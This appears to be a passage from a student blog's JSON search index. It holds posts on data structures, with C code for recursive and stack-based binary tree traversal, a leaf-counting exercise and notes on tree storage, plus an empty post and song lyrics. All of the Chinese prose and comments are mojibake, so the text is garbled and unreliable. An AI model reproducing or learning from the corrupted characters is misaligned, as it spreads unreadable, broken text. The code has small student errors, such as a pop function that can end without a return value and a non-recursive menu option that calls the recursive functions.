1.6.3 ååºéå† â€”- å·¦-&gt;å³-&gt;æ ¹ é¦–å…ˆè¿›è¡Œå·¦å­æ ‘çš„è®¿é—®ï¼ŒåŒæ ·éœ€è¦å°†å…¶å…ˆä¿å­˜åœ¨æ ˆä¸­ï¼Œä¾¿äºä¹‹åå¯¹å…¶ å³å­æ ‘ä»¥åŠæ ¹èŠ‚ç‚¹çš„è®¿é—®ã€‚ éœ€è¦ä½¿ç”¨ seqstackç±»å‹ ä¸­çš„ æ•°ç»„ tag ï¼Œå…¶æ¯ä¸ªå…ƒç´ çš„å€¼ä¸º0 æˆ– 1ï¼Œç”¨äºæ ‡è¯†æ ˆä¸­æ¯ä¸ªå…ƒç´ çš„çŠ¶æ€ã€‚ å½“ä¸€ä¸ªå…ƒç´ åˆšåˆšè¿›æ ˆæ—¶ï¼Œå½“å®ƒç¬¬ä¸€æ¬¡ä½äºæ ˆé¡¶å³å°†è¢«å¤„ç†æ—¶ï¼Œå…¶ tag å€¼ä¸º 0ï¼Œæ„å‘³ç€å®ƒçš„ å³å­æ ‘è¿˜æ²¡æœ‰è¿›è¡Œè®¿é—®ï¼Œåˆ™æ¥ä¸‹æ¥å°±åº”è¯¥è®¿é—®å®ƒçš„ å³å­æ ‘ï¼Œè¯¥å…ƒç´ ä»æ—§åœ¨æ ˆä¸­ï¼Œç„¶åå°†å…¶ tag å€¼æ”¹ä¸º 1ï¼Œæ„å‘³ç€æ­¤æ—¶å…¶ å³å­æ ‘å·²ç»è®¿é—®å®Œæˆï¼Œå½“å…¶ç¬¬äºŒæ¬¡å‡ºç°åœ¨æ ˆé¡¶å³å°†è¢«å¤„ç†æ—¶ï¼Œåˆ™æ„å‘³ç€æ¥ä¸‹æ¥åº”è¯¥è®¿é—®å®ƒæœ¬èº«ï¼Œå³æ ¹ç»“ç‚¹ï¼Œå¹¶å°†å…¶å‡ºæ ˆã€‚ 123456789101112131415161718192021void postorder(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; if(t)&#123; s.data[s.top] = t; s.tag[s.top] = 0; s.top++; t = t-&gt;lchild; &#125;else if(s.tag[s.top-1] == 1)&#123; s.top--; t = s.data[s.top]; printf(&quot;%c&quot;,t-&gt;data); t = NULL; &#125;else&#123; t = s.data[s.top-1]; s.tag[s.top-1] = 1; t = t-&gt;rchild; &#125; &#125;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"æ•°æ®ç»“æ„ç¬¬äºŒæ¬¡å®éªŒ-äºŒå‰æ ‘çš„éå†ï¼ˆé€’å½’ã€éé€’å½’ï¼‰","slug":"æ•°æ®ç»“æ„ç¬¬äºŒæ¬¡å®éªŒ-äºŒå‰æ ‘çš„éå†ï¼ˆé€’å½’ã€éé€’å½’ï¼‰","date":"2021-11-13T00:59:50.000Z","updated":"2021-11-13T08:16:40.431Z","comments":true,"path":"2021/11/13/æ•°æ®ç»“æ„ç¬¬äºŒæ¬¡å®éªŒ-äºŒå‰æ ‘çš„éå†ï¼ˆé€’å½’ã€éé€’å½’ï¼‰/","link":"","permalink":"https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/","excerpt":"","text":"å¤´æ–‡ä»¶ bintree.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//äºŒå‰æ ‘çš„å­˜å‚¨ï¼šé“¾å¼å­˜å‚¨ï¼ˆä¸å¸¦åŒäº²ï¼‰typedef char datatype; //å®šä¹‰ç»“ç‚¹ç±»å‹typedef struct node&#123; //äºŒå‰æ ‘ç»“ç‚¹ç±»å‹ datatype data; struct node *lchild,*rchild; //æŒ‡å‘å·¦å³å­æ ‘çš„æŒ‡é’ˆ&#125;bintnode;typedef bintnode *bintree;bintree root; //æ ¹ç»“ç‚¹//äºŒå‰æ ‘çš„åˆ›å»ºï¼šæŒ‰ç…§å‰åºéå†çš„ç»“æœåˆ›å»ºä¸€é¢— ç»™å®š äºŒå‰æ ‘bintree createbintree()&#123; char ch; bintree t; if((ch = getchar()) == &#x27;#&#x27;) //ç©ºå­æ ‘ t = NULL; else &#123; t = (bintnode *)malloc(sizeof(bintnode)); t-&gt;data = ch; t-&gt;lchild = createbintree(); t-&gt;rchild = createbintree(); &#125; return t;&#125;//æ³¨ï¼šè¾“å…¥æ—¶ï¼Œå¿…é¡»æŒ‰ç…§ å‰åºéå† çš„é¡ºåºè¿›è¡Œè¾“å…¥//éå†ç®—æ³•------é€’å½’ç®—æ³•-----------------------------------//å‰åºéå†ï¼ˆæ ¹ å·¦ å³ï¼‰void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125;//ä¸­åºéå†ï¼ˆå·¦ æ ¹ å³ï¼‰void inorder(bintree t)&#123; if(t)&#123; inorder(t-&gt;lchild); printf(&quot;%c&quot;,t-&gt;data); inorder(t-&gt;rchild); &#125;&#125;//ååºéå†ï¼ˆå·¦ å³ æ ¹ï¼‰void postorder(bintree t)&#123; if(t)&#123; postorder(t-&gt;lchild); postorder(t-&gt;rchild); printf(&quot;%c&quot;,t-&gt;data); &#125;&#125;//-------------------------------------------------------------//é¡ºåºæ ˆçš„å®šä¹‰typedef struct stack&#123; bintree data[100]; int tag[100]; //ä¸ºæ ˆä¸­æ¯ä¸ªå…ƒç´ è®¾ç½®çš„æ ‡è®°ï¼Œä¾¿äº ååºéå† int top; //æ ˆé¡¶æŒ‡é’ˆ&#125;seqstack;//è¿›æ ˆvoid push(seqstack *s,bintree t)&#123; s-&gt;data[s-&gt;top] = t; s-&gt;top++;&#125;//å‡ºæ ˆbintree pop(seqstack *s)&#123; if(s-&gt;top != 0)&#123; //åˆ¤ç©º s-&gt;top--; return(s-&gt;data[s-&gt;top]); &#125; return NULL;&#125;//éå†ç®—æ³•------éé€’å½’ç®—æ³•-----------------------------------//å‰åºéå†ï¼ˆæ ¹ å·¦ å³ï¼‰void preorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; //å½“å‰å¤„ç†çš„å­æ ‘ä¸ä¸ºç©ºæ ˆ æˆ– æ ˆä¸ä¸ºç©º æ—¶ if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125;&#125;//ä¸­åºéå†ï¼ˆå·¦ æ ¹ å³ï¼‰void inorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t!=NULL) || (s.top!=0))&#123; if(t)&#123; push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); printf(&quot;%c&quot;,t-&gt;data); t = t-&gt;rchild; &#125; &#125;&#125;//ååºéå†ï¼ˆå·¦ å³ æ ¹ï¼‰void postorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; if(t)&#123; s.data[s.top] = t; s.tag[s.top] = 0; s.top++; t = t-&gt;lchild; &#125;else if(s.tag[s.top-1] == 1)&#123; s.top--; t = s.data[s.top]; printf(&quot;%c&quot;,t-&gt;data); t = NULL; &#125;else&#123; t = s.data[s.top-1]; s.tag[s.top-1] = 1; t = t-&gt;rchild; &#125; &#125;&#125; æºæ–‡ä»¶ test.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &quot;bintree.h&quot;void Menu()&#123; printf(&quot;---------------------èœå•ç•Œé¢--------------------\\n&quot;); printf(&quot; \\n&quot;); printf(&quot; \\t1.é€’å½’éå† 2.éé€’å½’éå† \\n&quot;); printf(&quot; \\n&quot;); printf(&quot;---------------------0.é€€å‡º----------------------\\n&quot;);&#125;//æµ‹è¯•int main()&#123; int select; bintree t; printf(&quot;è¯·æ ¹æ®å‰åºéå†ç»“æœè¾“å…¥äºŒå‰æ ‘çš„ ç»“ç‚¹å€¼ï¼ˆç©ºå­æ ‘ä½¿ç”¨ # ä»£æ›¿ï¼‰ï¼š\\n&quot;); t = createbintree(); while(1)&#123; Menu(); printf(&quot;è¯·è¾“å…¥èœå•é€‰é¡¹ï¼š&quot;); scanf(&quot;%d&quot;,&amp;select); switch(select)&#123; case 1: //é€’å½’éå† printf(&quot;å‰åºéå†ç»“æœï¼š&quot;); preorder(t); printf(&quot;\\n&quot;); printf(&quot;ä¸­åºéå†ç»“æœï¼š&quot;); inorder(t); printf(&quot;\\n&quot;); printf(&quot;ååºéå†ç»“æœï¼š&quot;); postorder(t); printf(&quot;\\n&quot;); break; case 2: //é€’å½’éå† printf(&quot;å‰åºéå†ç»“æœï¼š&quot;); preorder(t); printf(&quot;\\n&quot;); printf(&quot;ä¸­åºéå†ç»“æœï¼š&quot;); inorder(t); printf(&quot;\\n&quot;); printf(&quot;ååºéå†ç»“æœï¼š&quot;); postorder(t); printf(&quot;\\n&quot;); break; case 0: return 0; default: printf(&quot;æ‚¨è¾“å…¥çš„é€‰é¡¹æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼š\\n&quot;); &#125; system(&quot;pause&quot;); system(&quot;cls&quot;); &#125;&#125; æµ‹è¯•ä»¥ä¸Šå›¾ äºŒå‰æ ‘ ä¸ºä¾‹ï¼š 1234å‰åºéå†ç»“æœï¼šabdefgc è¾“å…¥ï¼šabd##ef##g##c##ä¸­åºéå†ç»“æœï¼šdbfegacååºéå†ç»“æœï¼šdfgebca","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"Struggling","slug":"Struggling","date":"2021-11-07T04:52:59.000Z","updated":"2021-11-07T04:57:27.852Z","comments":true,"path":"2021/11/07/Struggling/","link":"","permalink":"https://xizhi-future.github.io/2021/11/07/Struggling/","excerpt":"","text":"","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"äºŒå‰æ ‘_é¢˜","slug":"äºŒå‰æ ‘-é¢˜","date":"2021-11-06T03:34:01.000Z","updated":"2021-11-14T09:29:03.147Z","comments":true,"path":"2021/11/06/äºŒå‰æ ‘-é¢˜/","link":"","permalink":"https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/","excerpt":"","text":"åˆ†åˆ«é‡‡ç”¨é€’å½’å’Œéé€’å½’æ–¹å¼ç¼–å†™ä¸¤ä¸ªå‡½æ•°ï¼Œæ±‚ä¸€é¢—ç»™å®šäºŒå‰æ ‘ä¸­å¶å­ç»“ç‚¹çš„ä¸ªæ•°bintree.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define N 1000extern char *a; /* å¦‚æœåœ¨å®šä¹‰ç‚¹ä¹‹å‰çš„å‡½æ•°æƒ³å¼•ç”¨è¯¥å…¨å±€å˜é‡ï¼Œåˆ™åº”è¯¥åœ¨å¼•ç”¨ä¹‹å‰ç”¨å…³é”®å­— extern å¯¹è¯¥å˜é‡ä½œâ€œå¤–éƒ¨å˜é‡å£°æ˜â€ï¼Œè¡¨ç¤ºè¯¥å˜é‡æ˜¯ä¸€ä¸ªå·²ç»å®šä¹‰çš„å¤–éƒ¨å˜é‡ *///é“¾å¼å­˜å‚¨ï¼Œä¸å¸¦åŒäº²typedef struct node&#123; char data; struct node *lchild,*rchild;&#125;binnode;typedef binnode *bintree;//äºŒå‰æ ‘çš„ åˆ›å»ºvoid create(bintree *t)&#123; char ch = *a++; if(ch == &#x27; &#x27;) *t = NULL; else&#123; *t = (bintree)malloc(sizeof(binnode)); (*t)-&gt;data = ch; create(&amp;(*t)-&gt;lchild); create(&amp;(*t)-&gt;rchild); &#125;&#125;//å‰åº é€’å½’ éå† äºŒå‰æ ‘void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125;//é¡ºåºæ ˆ å®šä¹‰typedef struct&#123; bintree data[N]; int top;&#125;seqstack;//åˆå§‹åŒ– é¡ºåºæ ˆvoid init(seqstack *s)&#123; s-&gt;top = -1;&#125;//åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©ºint empty(seqstack *s)&#123; if(s-&gt;top &gt; -1) return 0; //ä¸ä¸ºç©º else return 1; //ä¸ºç©º&#125;//åˆ¤æ–­æ ˆæ˜¯å¦ æ»¡int full(seqstack *s)&#123; if(s-&gt;top == N-1) return 1; //æ»¡ else return 0; //ä¸æ»¡&#125;//è¿›æ ˆvoid push(seqstack *s,bintree x)&#123; if(!full(s)) s-&gt;data[++s-&gt;top] = x;&#125;//å‡ºæ ˆbintree pop(seqstack *s)&#123; if(!empty(s)) return s-&gt;data[s-&gt;top--];&#125; 333.cpp 12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;bintree.h&quot;char *a = &quot;ABD EF G C &quot;; //å‰åºåºåˆ—//é€’å½’æ–¹æ³•æ±‚ äºŒå‰æ ‘ å¶å­ç»“ç‚¹çš„ä¸ªæ•°int lefts_1(bintree t)&#123; if(t == NULL) return 0; else if(!t-&gt;lchild &amp;&amp; !t-&gt;rchild) return 1; else return lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);&#125;//éé€’å½’æ–¹æ³• æ±‚ äºŒå‰æ ‘ å¶å­ç»“ç‚¹çš„ ä¸ªæ•° (éœ€è¦ä½¿ç”¨åˆ°é¡ºåºæ ˆ)int lefts_2(bintree t)&#123; seqstack s; int count = 0; init(&amp;s); while(t || !empty(&amp;s))&#123; if(t)&#123; if(!t-&gt;lchild &amp;&amp; !t-&gt;rchild) count++; push(&amp;s,t); t = t-&gt;lchild; &#125; else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125; return count;&#125;//æµ‹è¯•int main()&#123; bintree t; create(&amp;t); printf(&quot;é€’å½’ç®—æ³•ï¼šäºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°---%d\\n&quot;,lefts_1(t)); printf(&quot;éé€’å½’ç®—æ³•ï¼šäºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°---%d\\n&quot;,lefts_2(t));&#125; ä»¥ä¸Šé¢çš„äºŒå‰æ ‘ä¸ºä¾‹ï¼š 1char *a = &quot;ABD EF G C &quot;; //å‰åºåºåˆ—","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"æ ‘å‹ç»“æ„","slug":"æ ‘å‹ç»“æ„","date":"2021-10-30T09:48:21.000Z","updated":"2021-10-30T09:51:16.228Z","comments":true,"path":"2021/10/30/æ ‘å‹ç»“æ„/","link":"","permalink":"https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/","excerpt":"","text":"æ ‘å‹ç»“æ„1.1 æ¦‚å¿µæ ‘ï¼šn &gt;= 0 ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆï¼Œä¸€æ£µæ ‘æ˜¯ç”±æ ¹å’Œå®ƒçš„å­æ ‘æ„æˆï¼Œå­æ ‘åˆç”±å­æ ‘çš„æ ¹å’Œæ›´å°çš„å­æ ‘æ„æˆã€‚ ç©ºæ ‘ï¼šn = 0 æ£®æ—ï¼šä¸€æ£µæ ‘ä¸­æ¯ä¸ªç»“ç‚¹çš„å­æ ‘å¤šæ„æˆçš„é›†åˆï¼Œå³åœ¨æ£®æ—ä¸­çš„æ¯æ£µæ ‘åŠ ä¸Šä¸€ä¸ªå…±åŒçš„æ ¹ï¼Œæ£®æ—å°±æˆä¸ºäº†ä¸€é¢—æ ‘ã€‚ ä¸Šç«¯ç»“ç‚¹ã€ä¸‹ç«¯ç»“ç‚¹ åŒäº²ï¼ˆçˆ¶æ¯ã€å‰ä»¶ï¼‰ å­å¥³ï¼ˆå­©å­ã€åä»¶ï¼‰ å…„å¼Ÿ ç¥–å…ˆ å­å­™ æŸç»“ç‚¹çš„åº¦ï¼šè¯¥ç»“ç‚¹æ‰€æ‹¥æœ‰çš„å­å¥³æ•° æ ‘çš„åº¦ï¼šæ ‘ä¸­æ‰€æœ‰ç»“ç‚¹åº¦çš„æœ€å¤§å€¼ æ ‘æï¼šæ ‘ä¸­è¿æ¥ä¸¤ä¸ªç»“ç‚¹çš„çº¿æ®µ æ ‘çš„æ·±åº¦ï¼ˆé«˜åº¦ï¼‰ï¼šæ ‘çš„å±‚æ¬¡æ•° ç»ˆç«¯ç»“ç‚¹ï¼ˆå¶å­ç»“ç‚¹ï¼‰ï¼šåº¦ä¸º 0 çš„ç»“ç‚¹ éç»ˆç«¯ç»“ç‚¹ï¼ˆåˆ†æ”¯ç»“ç‚¹ï¼‰ï¼šåº¦ä¸ä¸º 0 çš„ç»“ç‚¹ è·¯å¾„ï¼šä»æŸç»“ç‚¹å¼€å§‹æ²¿ç€è‡ªä¸Šè€Œä¸‹çš„é¡ºåºåˆ°è¾¾å¦ä¸€ä¸ªç»“ç‚¹ï¼Œç§°è¯¥è·¯å¾„ è·¯å¾„çš„é•¿åº¦ï¼šæ˜¯æ‰€ç»è¿‡çš„æ ‘æçš„æ¡æ•° æ ‘å½¢ç»“æ„çš„è¡¨ç¤ºæ–¹æ³•ï¼šæ‹¬å·è¡¨ç¤ºæ³•ã€åµŒå¥—é›†åˆè¡¨ç¤ºæ³•ã€å‡¹å…¥è¡¨ç¤ºæ³• æœ‰åºæ ‘ æ— åºæ ‘ ä¾‹ï¼šä¸‹é¢çš„æ ‘ï¼Œè‹¥çœ‹æˆæ˜¯æœ‰åºæ ‘åˆ™ä¸ç›¸ç­‰ï¼›è‹¥è‚¯æˆæ˜¯æ— åºæ ‘ï¼Œåˆ™å¯çœ‹ä½œæ˜¯ç›¸ç­‰çš„ã€‚ 1.2 æ ‘çš„å­˜å‚¨ç»“æ„1.2.1 åŒäº²è¡¨ç¤ºæ³• â€”â€“ ä¸€ç»´æ•°ç»„data parent æ ¹ç»“ç‚¹ åŒäº² å€¼ å®šä¹‰ä¸º -1ï¼Œroot ä½ç½®å®šä¸º 0 1234567891011#define MAXSIZE 100typedef char datatype; //æ ¹æ®æ ‘ä¸­ç»“ç‚¹çš„å…·ä½“ç±»å‹è¿›è¡Œå®šä¹‰ï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾æ˜¯å­—ç¬¦å‹typedef struct node&#123; datatype data; //ç»“ç‚¹çš„ç±»å‹ int parent; //ç»“ç‚¹åŒäº²çš„ä¸‹è¡¨&#125;node;typedef struct tree&#123; node treelist[MAXSIZE]; //å­˜æ”¾ç»“ç‚¹çš„æ•°ç»„ int length,root; //æ ‘ä¸­å®é™…æ‰€å«ç»“ç‚¹çš„ä¸ªæ•° æ ¹ç»“ç‚¹çš„ä½ç½®&#125;tree; 1.2.2 å­©å­è¡¨ç¤ºæ³• â€”â€“ ä¸‰ç§æŒ‡é’ˆæ–¹å¼ å­©å­è¡¨ç¤ºæ³• â€”- æŒ‡é’ˆæ•°ç»„ æ¯ä¸ªç»“ç‚¹ï¼šä¸¤ä¸ªåŸŸ å€¼åŸŸï¼šdata æŒ‡é’ˆæ•°ç»„ï¼ˆæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªæŒ‡å‘è¯¥ç»“ç‚¹å­å¥³çš„æŒ‡é’ˆï¼‰ï¼šchild[m] åº¦ä¸ºmçš„æ ‘ï¼Œå…¶æŒ‡é’ˆæ•°ç»„çš„å¤§å°å³æ˜¯ m 12345678#define m 3 //æ ‘çš„åº¦æ•°typedef char datatype;typedef struct node&#123; datatype data; struct node *child[m]; //æŒ‡å‘å­å¥³çš„æŒ‡é’ˆæ•°ç»„&#125;node,*tree;tree root; //æŒ‡å‘æ ‘æ ¹ç»“ç‚¹çš„æŒ‡é’ˆ æ•°ç»„æ–¹å¼ å­©å­è¡¨ç¤ºæ³• â€”- ä¸€ç»´æ•°ç»„ æ¯ä¸ªç»“ç‚¹ï¼šåŸŸä¸ªæ•°ä¸å®š å€¼åŸŸï¼šdata ä¸€ç»´æ•°ç»„ï¼šchild[m] 1234567891011#define m 3#define MAXSIZE 20typedef char datatype;typedef struct node&#123; datatype data; int child[m];&#125;treenode;treenode tree[MAXSIZE]; //å­˜å‚¨æ ‘ç»“ç‚¹çš„æ•°ç»„int root; //æ ¹ç»“ç‚¹ ä¸‹æ ‡int length; //æ ‘ä¸­å®é™…æ‰€å«ç»“ç‚¹ä¸ªæ•° æŒ‡é’ˆæ–¹å¼å’Œæ•°ç»„æ–¹å¼å­©å­è¡¨ç¤ºæ³•ç¼ºç‚¹ï¼š æ¯ä¸ªç»“ç‚¹æ‰€å«å­å¥³ä¸ªæ•°ä¸çŸ¥é“ï¼Œä¸ç›¸åŒï¼Œåˆ™ child æ•°ç»„çš„å¤§å°ä»…ä»…ç”± æ ‘çš„åº¦å†³å®šï¼Œåˆ™ä¼šé€ æˆ ç©ºé—´çš„é—²ç½®ä¸æµªè´¹ã€‚ è§£å†³ï¼šé“¾è¡¨æ–¹å¼å­©å­è¡¨ç¤ºæ³• é“¾è¡¨æ–¹å¼ å­©å­è¡¨ç¤ºæ³• æ¯ä¸ªç»“ç‚¹ï¼šä¸¤ä¸ªåŸŸ å€¼åŸŸï¼šdata æŒ‡é’ˆåŸŸï¼ˆæŒ‡å‘è¯¥ç»“ç‚¹çš„ç¬¬ä¸€ä¸ªå­å¥³ï¼‰ æ¯ä¸ªç»“ç‚¹å­å¥³ åˆ æ’åˆ—èµ·æ¥å½¢æˆä¸€ä¸ªå•é“¾è¡¨ï¼Œn ä¸ªç»“ç‚¹ n ä¸ªå•é“¾è¡¨ å†ä½¿ç”¨æ•°ç»„å­˜å‚¨å•é“¾è¡¨çš„å¤´æŒ‡é’ˆ 12345678910111213141516#define MAXSIZE 50typedef char datatype;typedef struct chnode&#123; //å­©å­ç»“ç‚¹ç±»å‹ï¼šå•é“¾è¡¨ int child; struct chnode *next;&#125;chnode,*chpoint;typedef struct&#123; //æ ‘ä¸­æ¯ä¸ªç»“ç‚¹ç±»å‹ datatype data; chpoint firstchild; //æŒ‡å‘ç¬¬ä¸€ä¸ªå­å¥³ç»“ç‚¹çš„æŒ‡é’ˆ&#125;node;typedef struct&#123; //æ ‘çš„ç±»å‹ node treelist[MAXSIZE]; int length,root; //æ ‘ä¸­å®é™…æ‰€å«ç»“ç‚¹ä¸ªæ•°ã€æ ¹ç»“ç‚¹çš„ä½ç½®&#125;tree; é“¾è¡¨æ–¹å¼å­©å­è¡¨ç¤ºæ³• è™½ç„¶å¯ä»¥å»ºç«‹åŠ¨æ€çš„é“¾è¡¨ï¼Œä½†æ˜¯åˆè¦é¢å¤–éœ€è¦ç©ºé—´æ¥å­˜æ”¾ä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªå­å¥³çš„æŒ‡é’ˆ nextï¼Œåˆå¢åŠ äº†ç©ºé—´çš„å¼€é”€ã€‚ åº”æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œå­˜å‚¨æ–¹å¼çš„é€‰æ‹©ã€‚ 1.2.3 å­©å­å…„å¼Ÿè¡¨ç¤ºæ³• ï¼ˆäºŒå‰æ ‘è¡¨ç¤ºæ³•ï¼‰æ¯ä¸ªç»“ç‚¹ï¼šä¸‰ä¸ªåŸŸ å€¼åŸŸï¼šdata ä¸¤ä¸ªæŒ‡é’ˆåŸŸï¼šfirstchild rightchild (åˆ†åˆ«æŒ‡å‘è¯¥ç»“ç‚¹çš„ç¬¬ä¸€ä¸ªå­å¥³å’Œå…¶å³å…„å¼Ÿ) 1234567typedef char datatype;typedef struct node&#123; //æ ‘çš„ç»“ç‚¹ç±»å‹ datatype data; struct node *firstchild,*rightsibling; //ç¬¬ä¸€ä¸ªå­å¥³ã€å³å…„å¼Ÿ&#125;node,*pnode;pnode root; //æŒ‡å‘æ ‘æ ¹ç»“ç‚¹çš„æŒ‡é’ˆ 1.3 æ ‘çš„éå†æŒ‰ç…§æŸç§è§„å®šçš„é¡ºåºè®¿é—®æ ‘ä¸­æ¯ä¸€ä¸ªç»“ç‚¹ï¼Œä¸”æ¯ä¸ªç»“ç‚¹ä»…ä»…åªèƒ½è®¿é—®ä¸€æ¬¡ 1.3.1 å‰åºéå† â€”- æ ¹-&gt;å·¦-&gt;å³1.3.2 ååºéå† â€”- å·¦-&gt;å³-&gt;æ ¹1.3.3 å±‚æ¬¡éå† â€”- ä¸Šè‡³ä¸‹ï¼Œå·¦è‡³å³","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"é‚£ä¸€å¹´","slug":"é‚£ä¸€å¹´","date":"2021-10-26T13:00:00.000Z","updated":"2021-10-26T13:07:43.969Z","comments":true,"path":"2021/10/26/é‚£ä¸€å¹´/","link":"","permalink":"https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/","excerpt":"","text":"â€‹ é‚£ä¸€å¹´æ”¾è‚†çš„è‡ªç”± å°±è¿™æ ·ç‰µèµ·ä½ çš„æ‰‹ ä¸æ‡‚ä»€ä¹ˆæ¸©æŸ”ä¸é¡¾ä½ çš„æ„Ÿå— å¯‚å¯æ€»æŠŠæˆ‘å†²æ˜å¤´ æ˜¯ä½ ä½“è°…æˆ‘çš„ä»»æ€§è¦æ±‚ åœ¨åˆ«äººéƒ½æ”¾å¼ƒäº†æˆ‘ä»¥å æ²‰é»˜çš„å¿ƒä¸ºä½ å†æ¬¡æ‚¸åŠ¨ æµ©ç€šå®‡å®™ç¾ä¸èƒœæ”¶ åªæ˜¯æˆ‘ä¸é…å†æŠŠä½ æ‹¥æœ‰ å½“ä½ ç‹¬è‡ªé¢å¯¹å›å¿†æ±¹æ¶Œ é‚£ä¸€å¹´é›ªéƒ½ä¸‹çš„å¾ˆæ²‰é‡ ä¸æ•¢å›å¤´æ˜çŸ¥ä½ æ³ªåœ¨æµ æ³›é»„çš„æ—¥è®°å†™æ°¸ä¹… è®½åˆºæˆ‘ç°åœ¨æ‰ä¼šæ‡‚ æ€€å¿µä½ çš„æ¸©æŸ”è¿˜æœ‰ä»€ä¹ˆæ„Ÿå— å¯‚å¯è®©æˆ‘ä¹ æƒ¯äº†ç—› æ˜¯ä½ ä½“è°…æˆ‘çš„ä»»æ€§è¦æ±‚ åœ¨åˆ«äººéƒ½æ”¾å¼ƒäº†æˆ‘ä»¥å æ²‰é»˜çš„å¿ƒä¸ºä½ å†æ¬¡æ‚¸åŠ¨ æµ©ç€šå®‡å®™ç¾ä¸èƒœæ”¶ åªæ˜¯æˆ‘ä¸é…å†æŠŠä½ æ‹¥æœ‰ å½“ä½ ç‹¬è‡ªé¢å¯¹å›å¿†æ±¹æ¶Œ é‚£ä¸€å¹´é›ªéƒ½ä¸‹çš„å¾ˆæ²‰é‡ ä¸æ•¢å›å¤´æ˜çŸ¥ä½ æ³ªåœ¨æµ æˆ‘ä»¬çˆ±åˆ°å°½å¤´è°éƒ½ä¸è‚¯æ”¾æ‰‹ ä¸å¦‚åäººå°±ç”±æˆ‘æ‹…å½“æ‰¿å— ä¸ç®¡ä½ æ‡‚ä¸æ‡‚æˆ‘æˆå…¨çš„ç–¼ç—› æ˜¯ä½ ä½“è°…æˆ‘çš„ä»»æ€§è¦æ±‚ åœ¨åˆ«äººéƒ½æ”¾å¼ƒäº†æˆ‘ä»¥å æ²‰é»˜çš„å¿ƒä¸ºä½ å†æ¬¡æ‚¸åŠ¨ æµ©ç€šå®‡å®™ç¾ä¸èƒœæ”¶ åªæ˜¯æˆ‘ä¸é…æŠŠä½ æ‹¥æœ‰ å½“ä½ ç‹¬è‡ªé¢å¯¹å›å¿†æ±¹æ¶Œ é‚£ä¸€å¹´é›ªéƒ½ä¸‹çš„å¾ˆæ²‰é‡ ä¸æ•¢å›å¤´æ˜çŸ¥ä½ æ³ªåœ¨æµ","categories":[{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"ç¬¬å››ç« ã€ç¬¬äº”ç« ä¹ é¢˜ï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„ã€çŸ©é˜µï¼‰","slug":"ç¬¬å››ç« ã€ç¬¬äº”ç« ä¹ 